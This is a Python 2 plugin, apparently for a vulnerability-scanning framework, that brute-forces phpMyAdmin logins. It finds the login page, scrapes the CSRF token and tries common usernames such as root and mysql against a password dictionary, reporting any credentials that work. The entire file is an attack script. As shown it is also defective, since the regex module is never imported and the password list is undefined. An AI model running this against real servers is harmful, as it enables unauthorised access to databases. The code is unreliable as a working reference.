#!/usr/bin/env python
#coding:utf-8
"""
  Author:   --<n3bul@>
  Purpose: Mod
  Created: 11/22/17
"""


import urllib
import urllib2
from vikit.core.basic import target
from vikit.core.basic.modinput import TargetDemand

NAME = 'phpMyAdmin弱口令'

AUTHOR = 'n3bul@'

DESCRIPTION = 'weak password security '

RESULT_DESC = '''this description is about result!'''

DEMANDS = [TargetDemand('target', target.TYPE_URL)]


def check(ip, port, timeout):
    flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">',
                 'class="disableAjax" title=']
    user_list = ['root', 'mysql', 'www', 'bbs', 'wwwroot', 'bak', 'backup']
    error_i = 0
    try:
        res_html = urllib2.urlopen('http://' + ip + ":" + str(port), timeout=timeout).read()
        if 'input_password' in res_html and 'name="token"' in res_html:
            url = 'http://' + ip + ":" + str(port) + "/index.php"
        else:
            res_html = urllib2.urlopen('http://' + ip + ":" + str(port) + "/phpmyadmin", timeout=timeout).read()
            if 'input_password' in res_html and 'name="token"' in res_html:
                url = 'http://' + ip + ":" + str(port) + "/phpmyadmin/index.php"
            else:
                return
    except:
        pass
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
                res_html = opener.open(url, timeout=timeout).read()
                token = re.search('name="token" value="(.*?)" />', res_html)
                token_hash = urllib2.quote(token.group(1))
                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                user, password, token_hash)
                res = opener.open(url,postdata, timeout=timeout)
                res_html = res.read()
                for flag in flag_list:
                    if flag in res_html:
                        return u'phpmyadmin弱口令，账号：%s 密码：%s' % (user, password)
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3:
                    return False
            except Exception,e:
                return False

#----------------------------------------------------------------------

def exploit(target, payload, config):
    # parse url to host and port
    timeout = 5
    proto, rest = urllib.splittype(target)
    host, rest = urllib.splithost(rest)
    host, port = urllib.splitport(host)
    if port is None:
        port = 80
    port=int(port)
    if check(host, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit


if __name__ == '__main__':
    print exploit('http://192.168.1.183:8080','','{}')